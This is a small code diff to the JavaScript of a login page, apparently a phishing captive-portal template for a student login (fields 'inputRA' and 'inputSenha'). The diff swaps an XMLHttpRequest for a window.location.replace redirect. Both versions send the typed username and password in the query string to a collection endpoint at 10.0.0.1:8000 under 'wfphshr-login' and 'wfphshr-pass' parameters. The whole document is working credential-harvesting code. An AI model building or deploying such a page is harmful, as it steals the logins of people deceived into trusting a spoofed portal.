@@ -34,17 +34,12 @@ inputPass.addEventListener('keydown', (e) => {
 
 var form = document.getElementById('login-form');
 form.onsubmit = function(event){
-        var xhr = new XMLHttpRequest();
         
         let login = document.getElementById('inputRA').value;
 
         let senha = document.getElementById('inputSenha').value;
 
-        xhr.open('POST',`http://10.0.0.1:8000/index.php?wfphshr-login=${login}&wfphshr-pass=${senha}`, false)
-
-        xhr.send(null);
-
-        location.reload();
         
-        return false; 
-    }
+        window.location.replace(`http://10.0.0.1:8000/index.php?wfphshr-login=${login}&wfphshr-pass=${senha}`)
+
+} 
